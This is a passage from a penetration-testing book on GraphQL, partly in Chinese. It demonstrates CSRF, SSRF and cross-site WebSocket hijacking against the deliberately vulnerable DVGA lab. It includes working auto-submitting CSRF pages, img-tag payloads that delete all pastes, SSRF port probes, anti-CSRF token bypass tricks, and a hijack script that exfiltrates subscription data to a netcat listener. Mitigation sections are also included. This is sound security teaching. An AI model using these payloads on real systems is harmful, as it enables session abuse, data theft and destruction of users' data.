正如你所见，变更被编码并作为单个值发送到 query 正文参数。这是因为基于 POST 的 HTML 表单将 <input> 标签转换为 HTTP 正文参数，而我们使用了名为 query 的 input 标签。

由于 HTML 表单不能在没有 JavaScript 等语言帮助的情况下发送 JSON 格式的数据，提交的变更不是作为 JSON 发送的，正如 Content-Type 头部所示。在这里，它设置为 application/x-www-form-urlencoded 而不是 application/json。即使如此，一些 GraphQL 服务器仍可能在后端将有效载荷转换回 JSON，尽管缺少正确的 Content-Type 头部。

当 HTML 表单使用 POST 方法时，我们可以使用以下三种编码类型之一对数据进行编码：application/x-www-form-urlencoded、multipart/form-data 或 text/plain。默认情况下，当 enctype 属性未设置时，如我们的 exploit 代码中那样，表单使用 application/x-www-form-urlencoded，它在发送到服务器之前对所有字符进行编码。现在你已经看到 CSRF exploit 如何触发 GraphQL 查询，点击 Forward 将其发送到服务器。

## 自动提交 CSRF 表单

诱使用户点击按钮可能会带来挑战。如果用户犹豫不决并且没有继续进行，我们的攻击就会失败。如果我们可以在他们访问页面时自动提交表单怎么办？这可以用 JavaScript 代码实现。清单 9-4 在有人访问页面后两秒执行表单。

```
async function csrf() {
    for (let i = 0; i < 2; i++) {
        await sleep(i * 1000);
    }
    document.forms['auto_submit_for'].submit();
}
```

Listing 9-4: Automatic form submission with JavaScript

两秒的延迟是为了给你一些时间来理解你所看到的内容。在现实世界场景中，你希望立即代表受害者伪造请求，而没有任何延迟。

要亲眼看到此攻击，请将文件 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit_auto.html 下载到 Kali 的桌面。接下来，打开 Burp 的拦截模式；然后将下载的文件拖放到浏览器中。一旦你拖放它，消息 This form is going to submit itself in 2 seconds 应该会出现。接下来，你应该在 Burp 中看到被拦截的 POST 请求。如果你点击 Forward，你应该在浏览器中看到来自 GraphQL API 的响应，表明变更导致创建了一个新的粘贴，包括一些元数据，如粘贴的 ID、标题等。

要验证粘贴创建是否确实有效，打开 DVGA 用户界面 http://localhost:5013 并访问 Public Pastes 页面。你应该会看到图 9-4 中显示的新创建的粘贴。





![](img/2f244b00cd9f8f37cfc22f928aaa471a_253_0.png)

Figure 9-4: A paste created via a CSRF attack

Congratulations! You just simulated forging a paste mutation on behalf of a victim.

## Testing for GET-Based Vulnerabilities

Many GraphQL implementations forbid any use of GET, but sending mutations by using the GET method is especially taboo, because it’s considered a security risk that could lead to CSRF vulnerabilities, as you’ve learned. More often than not, GraphQL servers will reject any incoming queries that use a mutation over the GET method. To test whether a GraphQL server supports them, you could send a cURL command like this one:

```
# curl -X GET "http://localhost:5013/graphql?query=mutation%20%7B%20__typename%20%7D"
```

The %20 indicates spaces, %7B and %7D are the URL-encoded opening and closing curly brackets ({}) of the mutation query, and the plus sign (+) is an encoded space. When sent to DVGA, the response to this cURL command is as follows:

```
{"errors":[{"message":"Can only perform a mutation operation from a POST request."}]}
```

As you can see, DVGA does not allow mutations using the GET method. However, in penetration tests, assume that nothing is off the table and test all hypotheses, because you never know when you will run into a completely custom GraphQL implementation that deviates from the standard.

GET-based CSRF attacks are somewhat more interesting than POST-based ones because applications often won’t implement anti-CSRF protections on GET requests. This is because state-changing actions typically use other HTTP methods. If a server allows mutations over GET, we could exploit the HTML anchor (<a>) tag with the hypertext reference attribute (href) to build a hyperlink that will send the mutation to the server. The anchor tag executes only GET-based requests, which is why it isn’t a great candidate for POST-based CSRF exploitation:

```
<a href="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" />
```

Alternatively, we could use image tags (<img>) with the source (src) attribute to embed our mutation, like so:

```
<img src="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" />
```

This technique works on any platform that lets you specify innocent-looking HTML tags such as <a> and <img>. Thus, in addition to tricking victims to visit an attacker-controlled website containing these links, you might be able to use them in legitimate websites that accept URLs and render the links on the client side. As a result, clients will make direct GET requests to another site chosen by the attacker.

Although we can't send mutations to DVGA by using the GET method, we can try using GET to send the state-changing query deleteAllPastes. As the name implies, the deleteAllPastes query will delete all pastes in the server's database. We can exploit this query by using either GET or POST.

To perform such a CSRF attack, this HTML file uses <form> tags to submit the query. JavaScript code defined using the <script> HTML tags makes the request automatically, as soon as the victim loads the page:

```
<html>
<body>
<h1>This form is going to submit itself in 2 seconds...</h1>
<form id="auto_submit_form" method="GET" action="http://localhost:5013/graphql">
<input type="hidden" name="query" value="query { deleteAllPastes }"/>
<input type="submit" value="Submit">
</form>
</body>

<script>
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function csrf() {
  for (let i = 0; i < 2; i++) {
    await sleep(i * 1000);
  }
  document.forms['auto_submit_form'].submit();
}

csrf();

</script>
</html>
```

To test this attack, save the file at https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/get_csrf_submit_auto.html to your desktop as an HTML file. Make sure Burp Suite is intercepting traffic, and then drag

and drop the HTML file into your browser window. You should see the outbound HTTP GET request sent after two seconds:

```
GET /graphql?query=query+%7B+deleteAllPastes+%7D HTTP/1.1
Host: localhost:5013
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
--snip--
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

We’re able to use CSRF to forge a GET-based query that deletes all pastes. Now let’s try using HTML tags such as <a> and <img> to trigger a GET-based CSRF. One way to do this is to create an HTML page that performs a GET request using an <img> tag, such as the one in Listing 9-5.

```
<html>
<body>
<h1>GET-based CSRF using an image tag</h1>
<img src="http://localhost:5013/graphql?query={deleteAllPastes}" style="display: none;" />
</body>
</html>
```

Listing 9-5: GET-based CSRF using image tags

Save this as an HTML file. As before, it will execute as soon as the page loads, because the browser will try to fetch the URL defined using the src attribute and send a GraphQL query.

## Using HTML Injection

A second way we could exploit GET-based CSRF is by abusing another vulnerability, such as HTML injection, which allows an attacker to inject HTML tags into a web page. If a victim visits the site, their browser will render the HTML code. In particular, if an attacker is able to inject a hyperlink using the <a> tag or an image link using the <img> tag, clients will initiate the GET request when they visit the page, following the tags’ default behavior.

Can we trigger CSRF on DVGA using HTML injection? Let’s find out. Open Firefox, navigate to http://localhost:5013, and go to the Public Pastes page. Next, open Developer Tools (CTRL-SHIFT-I) and go to the Network tab. Ensure that Altair is pointing to http://localhost:5013/graphql and enter the mutation in Listing 9-6, which will create a new paste with a CSRF payload as its content.

```
mutation {
  createPaste(content:"<img src=\"http://localhost:5013/graphql?query={ deleteAllPastes }\" /></img>", title:"CSRF using image tags", public: true, burn: false) {
    paste {
      id
      content
```
```
}
}
}
```

# Listing 9-6: Creating a paste containing a CSRF payload

This request injects the <img> tag containing the deleteAllPastes query into the Public Pastes page. To do so, it relies on the fact that DVGA fetches paste data by using GraphQL subscriptions (with WebSocket as the transport protocol). Your browser subscribes to new paste-creation events, so whenever a new paste is created, the subscription automatically populates the page with its title, content, and other information. By putting our payload in the createPaste content field, we effectively embed it on the page.

Now, when clients send queries using createPaste and the content field, they will render the payload. Take a close look at what happens in your Network tab once you send the query. You should see the outbound GET request shown in Figure 9-5.

![](img/2f244b00cd9f8f37cfc22f928aaa471a_256_0.png)

## Figure 9-5: A GET-based query sent through an HTML image tag containing a CSRF payload

If you refresh your browser, you should no longer see any pastes, as the CSRF attack should have deleted them. Click Rollback DVGA, located in the top-right drop-down menu, to restore the server to its original state.

We’ve discussed GET- and POST-based CSRF attacks. We’ve also discussed how some GraphQL servers attempt to prevent CSRF by rejecting mutations using the GET method, and how to test for those as well. Next, let’s use BatchQL and GraphQL Cop to automatically flag GraphQL servers that might be vulnerable to CSRF.

## Automating Testing with BatchQL and GraphQL Cop

BatchQL has multiple CSRF-related test cases. Let’s run it against DVGA to see what information we’re able to get about its CSRF vulnerabilities:

```
# cd ~/batchql
# python3 batch.py -e http://localhost:5013/graphql | grep -i CSRF

CSRF GET based successful. Please confirm that this is a valid issue.
CSRF POST based successful. Please confirm that this is a valid issue.
```

As you can see, we used grep with the -i flag to filter out results unrelated to CSRF vulnerabilities. BatchQL detected that both GET and POST allow non-JSON-based queries.

GraphQL Cop is similar to BatchQL in the way it tests for CSRF vulnerabilities, except it additionally tests whether the server supports mutations over GET:

```
# cd ~/graphql-cop
# python3 graphql-cop.py -t http://localhost:5013/graphql | grep -i CSRF

[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF))
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery)
```

Automated tools may introduce false positives, so we recommend always manually verifying that their results are accurate.

## Preventing CSRF

In the years since CSRF was discovered, browser vendors such as Mozilla and Google have significantly improved their CSRF mitigations. Various open source web server frameworks have also made CSRF vulnerabilities tremendously harder to exploit. This section explains the CSRF mitigations that exist today at the browser and server levels.

## The SameSite Flag

Browsers have started supporting a special HTTP cookie attribute called SameSite. This attribute allows developers to decide whether the client browser should attach the cookie when making cross-site requests. To set this cookie attribute, the application needs to set a Set-Cookie response header. This interferes with a CSRF attack’s attempt to send a request from the attacker website (say, attacker.com) to a target website of interest (banking.com).

One challenge with using the SameSite attribute is that older browsers may not support it. However, most of the modern browsers do. Mozilla’s Developer website has a dedicated section about SameSite browser support that developers can use as a reference.





SameSite cookie 属性接受三个值：

- **Strict** 仅在用户在同一源内浏览时发送 cookie
- **Lax** 仅当请求使用 HTTP GET 且未由脚本发起，例如顶级导航时发送 cookie
- **None** 在跨站请求中发送 cookie，实际上不提供任何保护

设置了 SameSite 属性的 cookie 的 GraphQL 服务器会返回一个 Set-Cookie HTTP 响应头：

```
Set-Cookie: session=mysecretsession; SameSite=Strict
```

当网站设置 cookie 时未指定 SameSite 属性，现代浏览器如 Chrome 会假定其设置为 Lax。当 cookie 设置为 Strict 时，如果发生 CSRF 攻击，cookie 不会在跨站请求中发送。

## 反 CSRF 令牌

为了在服务器级别防止 CSRF 漏洞，Web 框架引入了 *反 CSRF 令牌*。这些是在服务器上生成的难以猜测、密码学强度高且唯一的字符串。服务器期望客户端在每次请求中传递反 CSRF 令牌。当服务器看到没有此类令牌的传入请求时，服务器会拒绝该请求。

服务器可以按请求生成反 CSRF 令牌，或为用户会话的生命周期生成一次。按请求生成令牌是更强的缓解措施且更难击败，因为它减少了攻击者获取有效令牌的时间。一旦令牌失效，服务器不应再接受它。

客户端通常通过使用 HTTP 请求头，例如 X-CSRF-TOKEN，或在 HTTP 正文参数中，例如 csrf-token，将反 CSRF 令牌发送到服务器。许多 Web 框架都内置了 CSRF 保护支持，使开发人员能够在无需从头实现 CSRF 防御的情况下构建安全应用程序。以下是包含反 CSRF 令牌的示例 HTTP 请求：

```
POST /graphql HTTP/1.1
Host: localhost:5013
Content-Length: 19
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.3

query=mutation%7BcreatePaste%28title%3A%22CSRF%22%2Ccontent%3A%22content%22%2Cpublic%3Atrue%2Cburn%3Afalse%29%7Bpaste%7Bid+content+title+burn%7D%7D&csrf-token=asj2nrcs82kssadis
```

重要的是要记住，就像任何其他安全控制一样，如果实现不正确，令牌也会被击败。以下是攻击者可能绕过反 CSRF 令牌的几种方式：

- **删除 CSRF 令牌值。** 一些反 CSRF 实现在 CSRF 参数存在但未设置值时可能会失败，导致值为 null。
- **完全删除 CSRF 参数和令牌值。** 一些反 CSRF 实现在参数未设置时可能会失败。
- **在后续请求中重用 CSRF 令牌。** 如果攻击者能够捕获一个有效的反 CSRF 令牌，例如属于其自己的会话的令牌，并且服务器不使已使用的令牌失效，则有可能在 CSRF 攻击中重用该令牌。
- **用相同字符长度的随机字符串替换 CSRF 令牌。** 一些服务器可能只是查看令牌值并检查其长度。如果长度等于正常令牌的长度（例如 14 个字符），它们可能会让请求通过。
- **暴力破解 CSRF 令牌。** 一些 CSRF 令牌在密码学上可能很弱，使攻击者能够暴力破解它们。例如，它们可能长度较短，使用可预测的模式，或采用弱的加密算法。

浏览器和服务器级别的 CSRF 保护结合起来遵循纵深防御安全原则，使 CSRF 对攻击者更难利用。

## 服务器端请求伪造

*SSRF* 允许攻击者代表受影响的服务器执行请求。使用 SSRF，攻击者可以强制服务器连接到内部服务，通常提供对受限网络区域、内部 API 和敏感数据的访问。Web 应用程序可以通过多种方式引入 SSRF。经常，应用程序会向客户端公开功能，从客户端获取输入并使用它来执行特定操作。例如，考虑一个应用程序允许用户提供他们喜欢的照片的 URL，该照片来自特定网站，例如 *imgur.com*。应用程序然后下载照片并通过电子邮件作为附件发送给用户。

在此示例中，应用程序期望两个输入：包含图像的 *imgur.com* 的 URL，以及电子邮件地址。如果攻击者提供其他输入，例如像 *http://lab.blackhatgraphql.com/cat.png* 这样的 URL 和像 *info@blackhatgraphql.com* 这样的电子邮件地址会怎样？如果应用程序没有通过例如确保 URL 的域名为 *imgur.com* 来验证输入，那么一旦用户提交此信息，应用程序可能会改为尝试访问攻击者控制的网站，将图像下载到磁盘并保存到文件夹中。它可能会然后使用命令行实用程序或脚本将带有附件的电子邮件发送给用户。

攻击者还可以提供各种 URL 作为输入，包括包含私有、不可路由 IP 地址的 URL（例如 172.16.0.0/24 或 10.10.0.0/24）。如果服务器恰好存在于这些范围存在的网络上，它可能会对内部服务执行调用，例如数据库或网络上的内部网站，使攻击者能够读取他们本不应该能够访问的服务器的响应。攻击者还可以尝试猜测内部 URL，希望找到解析为内部地址的有效 URL（例如 internal.example.com、internal2.example.com 等）。

随着云基础设施的采用，SSRF 已成为黑客寻找的最大漏洞之一。这是因为许多云提供商托管元数据端点 URL，这些 URL 允许云实例读取有关其自身的信息，例如分配给实例的角色和正在使用的凭据。由于 SSRF 可能允许攻击者进行内部调用，因此它可能为他们提供获取有关易受攻击服务器的此敏感信息的能力。

> NOTE 云元数据端点不在本书的讨论范围之内。你可以在 https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html 阅读有关 AWS 元数据的更多信息，以及在 https://cloud.google.com/compute/docs/metadata/overview 阅读有关 Google Cloud 元数据的更多信息。

攻击者可以尝试对除 HTTP 之外的各种协议进行 SSRF，例如文件传输协议（FTP）、服务器消息块（SMB）、轻量级目录访问协议（LDAP）等。而且，就像其他 API 技术一样，GraphQL 也并非免疫于 SSRF 漏洞。

### 了解 SSRF 的类型

在执行 GraphQL 渗透测试时，你可能会遇到三种 SSRF 漏洞。就像你在第 8 章中学到的盲 SQL 注入一样，盲 SSRF 漏洞不会提供漏洞存在的具体视觉指示。相反，攻击者可能能够通过使用可以侦听各种协议消息的带外利用工具来推断漏洞的存在。

例如，回想一下我们之前讨论的 URL 图像获取服务。在利用盲 SSRF 时，攻击者可能能够通过在托管 lab.blackhatgraphql.com 的远程服务器上捕获流量来判断应用程序是否易受攻击。当攻击者提交 URL http://lab.blackhatgraphql.com/cat.png 时，应用程序可能在尝试通过 HTTP 执行图像获取之前在不同协议上发起某些连接，例如端口 80 上的 TCP 连接。这可能表明应用程序正在尝试访问攻击者控制的服务器。

确定盲 SSRF 存在的另一种方法是通过时序分析。攻击者可以在攻击者控制的服务器返回的 HTTP 响应中引入人为的延迟，然后根据易受攻击的应用程序返回响应的时间来确定攻击是否成功。





正如名称所示，半盲 SSRF 会提供一些证据，但并非完全表明存在 SSRF 漏洞。信息可能包括错误或部分服务器响应。想象一下，攻击者尝试向图像获取服务提交各种内部 URL，以尝试发现主机所在的网络。例如，他们可能会提交 http://10.10.0.254/index.html 或 http://172.12.0.254/index.html。在成功尝试中，应用程序可能会发送一封没有附件的电子邮件，而在失败尝试中，则根本不会发送电子邮件。

作为渗透测试人员，你希望发现的 SSRF 的最后一种类型是非盲 SSRF（也称为全读 SSRF），其中服务器向攻击者返回完整的响应，表明存在 SSRF 漏洞。在图像获取服务的示例中，提供非基于图像的 URL 给应用程序后，我们可能会看到完整的 HTTP 响应。

## 搜索易受攻击的操作、字段和参数

在测试 GraphQL 服务器是否存在 SSRF 时，检查所有可能的操作，无论它们是突变还是查询。正如你可能预期的那样，SSRF 通常会影响一个或多个接受值（如标量）的易受攻击的 GraphQL 参数。

同时也要密切关注 GraphQL 字段名称，以了解它们的设计用途。例如，字段名称中包含 fetch、import、download 或 read 等动词，都可能意味着服务器执行某种操作，例如从某处读取或获取资源。除了字段名称之外，某些参数名称也可能暗示服务器正尝试执行出站连接以解析查询。以下是一些示例：

- ip
- url
- host
- network
- domain
- site
- target
- fetch
- img_url
- target_url
- remote_url

这是一个部分列表，但它应该能让你了解哪些关键字可能是有提示性的。

## 测试 SSRF

让我们继续使用 Burp Suite 在 DVGA 中测试 SSRF 漏洞。点击 Open Browser 打开内置浏览器。然后，快速浏览 DVGA 的 Web 界面。有没有什么是显眼的？比如 Import a Paste 页面，如图 9-6 所示？

![](img/2f244b00cd9f8f37cfc22f928aaa471a_262_0.png)

图 9-6：DVGA 的 Import a Paste 页面

Import from URL 表单接受一个 URL 并尝试从中导入粘贴内容。要查看提交 URL 时会发生什么，请在 Burp Suite 中打开 Intercept 模式，在搜索栏中输入任意 URL，然后点击 Submit。 （这里有一个你可以导入的示例粘贴：https://pastebin.com/raw/LQ6u1qyi。）你应该会在 Burp 中看到如下请求：

```
POST /graphql HTTP/1.1
Host: localhost:5013
Content-Length: 302
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
--snip--
Origin: http://localhost:5013
Referer: http://localhost:5013/import_paste
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: env=graphql:disable
Connection: close

{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n            result\n        }\n}","variables":{"host":"pastebin.com","port":443,"path":"/raw/LQ6u1qyi", "scheme":"https"}}
```

正如你所见，该请求使用 importPaste 突变，它接受四个参数：host、port、path 和 scheme。POST JSON 有效负载包含 variables 键，以将 URL 组件（值）传递给这些参数。

在幕后，DVGA 使用 URL 作为 HTTP GET 请求的一部分，读取响应并将其添加到其粘贴数据库中。要查看导入的内容，请在 Burp Suite 中点击 Forward 按钮将请求发送到 GraphQL 服务器，关闭 Intercept 模式，然后转到 Private Pastes 页面。

在底层，GraphQL 发出了 HTTP 调用以从 URL 检索此内容。这种类型的功能明显表明存在 SSRF！让我们手动探索相同的 GraphQL 查询，改变一些值。突变如清单 9-7 所示。

```
mutation {
  importPaste(scheme: "https", host:"pastebin.com", port:443, path:"/raw/LQ6u1qyi") {
    result
  }
}
```

清单 9-7：importPaste 突变

仔细观察，四个参数构成了 GraphQL 将构造的 URL 的构建块（在本例中为 https://pastebin.com:443/raw/LQ6u1qyi）。如果我们可以使用 HTTP（或 HTTPS）方案并提供我们想要的任何域名和端口，就没有什么能阻止我们四处探查 DVGA 网络上的其他服务，对吧？

让我们看看当我们指定内部 URL 而不是外部 URL 时会发生什么。在清单 9-8 中，我们指定了不同的 URL 目标以从中导入粘贴内容。突变将强制 DVGA 通过向 http://localhost:8080/paste.txt 发出 HTTP 请求来导入粘贴内容。请注意，虽然 localhost 是一个有效的 host，但端口 8080 在 DVGA 容器上未打开。因此，此请求不会返回任何有意义的内容。

```
mutation {
  importPaste(scheme: "http", host:"localhost", port:8080, path:"/paste.txt") {
    result
  }
}
```

清单 9-8：importPaste 突变的恶意版本

运行突变后，你应该会从 Altair 看到此响应：

```
{
  "data": {
    "importPaste": {
      "result": ""
    }
  }
}
```

服务器返回一个空的结果对象值。我们能够在 Altair 中相当快地获得此响应。 （在我们的实验室中，我们在 100 毫秒内收到了它。）因此，我们现在知道，如果我们探测一个未打开的端口，我们会立即得到一个没有数据的结果，而 result JSON 键中没有数据。

接下来，让我们通过探测确实存在的服务来模拟 SSRF 漏洞。为了在 DVGA 容器上模拟额外的服务，我们将使用 Netcat。首先，通过在 Kali 的终端中运行以下 Docker 命令，在 DVGA 容器中启动 Netcat 侦听器：

```
# sudo docker exec -it dvga nc -lvp 7773

listening on [::]:7773 ...
```

接下来，我们将构造一个有效负载，以向 Netcat 正在绑定的端口（7773）发送 HTTP 探测，如清单 9-9 所示。

```
mutation {
  importPaste(scheme: "http", host:"localhost", port:7773, path: "/ssrf") {
    result
  }
}
```

清单 9-9：滥用 SSRF 漏洞的突变查询

如果你发送此查询，你应该会在 Netcat 侦听器中看到与清单 9-10 类似的输出。

```
connect to [::ffff:127.0.0.1]:7773 from localhost:55554 ([::ffff:127.0.0.1]:55554)
GET /ssrf HTTP/1.1
Host: localhost:7773
User-Agent: curl/7.83.1
Accept: */*
```

清单 9-10：DVGA 请求到达内部服务

这表明 DVGA 向一个内部、未暴露的端口发出了 GET 请求。请注意，Kali 机器无法直接访问此端口；我们使用 DVGA 本身来访问它，这说明了 SSRF 漏洞如何使攻击者能够访问他们否则无法直接访问的服务。这种 SSRF 攻击更具体地说是跨站端口攻击（XSPA），它属于 SSRF 漏洞类别。

你可能还注意到，Altair 在发送清单 9-10 中的 importPaste 突变后会挂起。这是因为我们打开的 Netcat 侦听器不会返回响应，但 Altair 会等待 GraphQL API 的响应。这实际上是一种盲 SSRF，因为作为攻击者，我们无法直接访问响应；我们所知道的只是当我们探测一个打开的端口时客户端会挂起。你可以通过按 CTRL-C 关闭 Netcat 侦听器。Altair 的状态应恢复正常。

## 防止 SSRF

为了确定应用程序是否可能容易受到 SSRF 攻击，我们可以问自己这个问题：客户端是否控制 API 流使用的任何目标 URL？SSRF 大多涉及通过将目标 URL 指向意外的受限内部或外部位置来操纵它们。以下是一些保护策略：

- **输入验证。** 允许拒绝传递给作为查询或突变一部分接受 URL 的 GraphQL 参数的危险字符。确保只接受授权的 URL，并有助于降低 SSRF 风险。
- **网络分段。** 通过确保应用程序只能与相关的内部网络通信来帮助最大程度地降低风险。你在暂存网络中的易受攻击的 GraphQL API 不应能够访问你在生产网络中的另一个 GraphQL API。
- **威胁建模。** 允许在 GraphQL API 的开发生命周期早期识别潜在风险，更具体地说是具有可能容易受到 SSRF 攻击的查询或突变。
- **最小权限原则。** 有助于最大程度地减少影响范围。确保 GraphQL 运行的实例没有过于宽松的权限，并且无法在应用程序之间执行特权操作。

在下一节中，我们将转向讨论影响 GraphQL 订阅的基于劫持的漏洞。

## 跨站 WebSocket 劫持

如果攻击者可以通过获取授予应用程序特殊权限的会话 cookie 来劫持用户的会话，他们就可以使用受害者的权限执行操作并访问其敏感数据。CSWSH 是一种影响 WebSocket 通信握手部分的 CSRF 漏洞，该通信使用基于 cookie 的身份验证。由于 GraphQL API 可以使用 WebSocket 进行订阅操作，因此它们有风险容易受到 CSWSH 影响。

在第 3 章中，我们展示了使用 WebSocket 在 GraphQL 客户端和服务器之间使用订阅进行通信时发送的握手请求和响应。客户端通过 HTTP 发起这些 WebSocket 握手，如果 WebSocket 服务器实现身份验证，则可能包含如下 cookie：

```
Cookie: session=somesessionID
```

当 WebSocket 连接握手不包含防止攻击者执行跨源请求的反 CSRF 令牌时，就会发生 CSWSH。当不存在此类令牌时，攻击者很容易



开发专门的代码，代表受害者伪造 WebSocket 消息并使用其已认证的会话。

除了反 CSRF 令牌之外，WebSocket 服务器还应验证 WebSocket 握手请求中的 Origin 头。Origin 头具有重要的安全功能，因为它标识了请求的来源。如果服务器不检查此头，就无法知道握手请求是否被伪造。任何具有未经授权来源的握手都应返回 403 Forbidden 响应代码，而不是 101 Switching Protocols。

## 查找订阅操作

CSWSH 漏洞存在于传输协议层，因此不是 GraphQL 本身的缺陷。在 GraphQL 的上下文中，你只有在 GraphQL API 使用订阅来执行实时更新时才会遇到它们。因此，为了测试 CSWSH，我们首先需要知道目标应用程序是否有任何订阅相关字段。为了发现这一点，我们可以使用一个依赖于 subscriptionType 来获取字段名称的 introspection 查询，如清单 9-11 所示。

```
query {
  __schema {
    subscriptionType {
      fields {
        name
      }
    }
  }
}
```

清单 9-11：使用 introspection 获取订阅字段名称

如果你在 Altair 中针对 DVGA 运行此查询，你应该会注意到模式中有一个名为 paste 的字段，订阅操作可以使用它。

## 劫持订阅查询

现在让我们劫持一个订阅查询并外泄其响应。为了模拟此攻击，我们将按以下步骤操作。从攻击者的角度来看，我们将在端口 4444 上打开一个 Netcat TCP 监听器，在那里接收外泄的响应。接下来，从受害者的角度来看，我们将模拟用户因社会工程攻击而受害，通过将 HTML 文件拖放到浏览器中使其加载 JavaScript 代码，劫持用户的会话以执行 WebSocket 握手并订阅 paste 事件。我们还将在 DVGA 中创建一个新的 paste 以供订阅查询接收。这将模拟受害者可能有权访问但攻击者不应访问的网站活动。最后，我们将读取 Netcat 获取的外泄响应。

让我们首先通过检查底层代码来了解攻击模式。保存 CSWSH 劫持代码 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/websockets_hijack.html 到你的桌面。确保文件名具有 .html 扩展名。清单 9-12 显示了代码。

```
<html>
<h2>WebSockets Hijacking and GraphQL Subscription Response Exfiltration Demo</h2>
</html>

<script>
const GQL = {
CONNECTION_INIT: 'connection_init',
CONNECTION_ACK: 'connection_ack',
CONNECTION_ERROR: 'connection_error',
CONNECTION_KEEP_ALIVE: 'ka',
START: 'start',
STOP: 'stop',
CONNECTION_TERMINATE: 'connection_terminate',
DATA: 'data',
ERROR: 'error',
COMPLETE: 'complete'
}

ws = new WebSocket('ws://localhost:5013/subscriptions');
ws.onopen = function start(event) {
var query = 'subscription getPaste {paste { id title content ipAddr userAgent public owner {name} }}';

var graphqlMsg = {
type: GQL.START,
payload: {query}
};
ws.send(JSON.stringify(graphqlMsg));
}
ws.onmessage = function handleReply(event) {
data = JSON.parse(event.data)
fetch('http://localhost:4444/?'+ JSON.stringify(data), {mode: 'no-cors'});
}
</script>
```

清单 9-12：执行 WebSocket 劫持的 JavaScript 代码

我们在 ① 处初始化一个新的 WebSocket 对象并指定 DVGA 的订阅 URL。在 ② 处，我们声明一个包含订阅查询的 query 变量。此查询订阅 paste 事件并获取诸如 id、title、content、ipAddr、userAgent、public 和所有者名称等字段。在 ③ 处，我们通过 WebSocket 协议发送包含此查询的 JSON 字符串。消息发送后，当接收到传入的 WebSocket 消息时，ws.onmessage 事件处理程序将被调用。此处理程序将把消息解析为 JSON 对象 ④。一旦消息被解析，代码在 ⑤ 处将通过使用 GET URL 参数将响应外泄到目标（在本例中为 http://localhost:4444）。

让我们开始吧！在终端窗口中，运行以下命令以启动 Netcat 监听器：

```
# nc -vlp 4444
```

listening on [any] 4444 ...

我们传递给 Netcat 的 -v l p 标志告诉它以侦听模式 (-l) 在详细模式 (-v) 下监听端口 (-p) 4444。接下来，打开一个浏览器窗口并将你之前下载的 HTML 文件拖放到浏览器的窗口中。你应该会看到图 9-7 所示的页面。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_268_0.png)

图 9-7：WebSocket 劫持演示

接下来，打开另一个浏览器窗口并点击左侧的 Create Paste 以打开 http://localhost:5013 上的 Create a Paste 页面。输入你能识别的标题和你的消息，如图 9-8 所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_268_1.png)

图 9-8：DVGA 中的 paste 创建

接下来，点击 Submit，并密切关注 Netcat 正在运行的终端窗口。你应该会看到类似这样的输出：

```
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 50198
GET /?{%22type%22:%22data%22,%22payload%22:{%22data%22:{%22paste%22:{%22id%22:%22%2214%22,%22title%22:%22This%20will%20get%20exfiltrated!%22,%22content%22:%22Exfiltrated%20Data%22,%22ipAddr%22:%22172.17.0.1%22,%22userAgent%22:%22Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/96.0.4664.45%20Safari/537.36%22,%22public%22:true,%22owner%22:{%22name%22:%22DVGAUser%22}}}} HTTP/1.1
Host: localhost:4444
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept: */*
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Netcat 从受害者那里接收到包含外泄 paste 数据的 GET 请求。你可以看到请求的 URL 参数以 /?{%22type 开头。有效载荷是 URL 编码的，但当你对其进行解码时，你可以立即看出它是使用 DVGA 用户界面创建的 paste 数据。你可以使用 https://meyerweb.com/eric/tools/dencoder 等网站或使用终端中的 Python 进行此 URL 解码，如清单 9-13 所示。

```
# echo 'ADD-STRING-HERE' | python3 -c "import sys;
from urllib.parse import unquote; print(unquote(sys.stdin.read()));"
```

清单 9-13：使用 Python 进行 URL 解码

我们通过强制客户端访问攻击者控制的网站来外泄数据，在该网站上，自定义代码发送伪造的跨站 WebSocket 消息并将其响应外泄到远程 Netcat 监听器。

## 防止 CSWSH

由于 CSWSH 是一种 CSRF 攻击，你可以通过使用 CSRF 缓解技术来防止它。使用除 cookie 之外的其他形式的身份验证来验证客户端的 WebSocket 服务器，例如 JWT，也可以提供保护。当服务器使用 JWT 令牌时，跨站 WebSocket 消息将无法在没有适当头的情况下进行身份验证，导致握手失败。

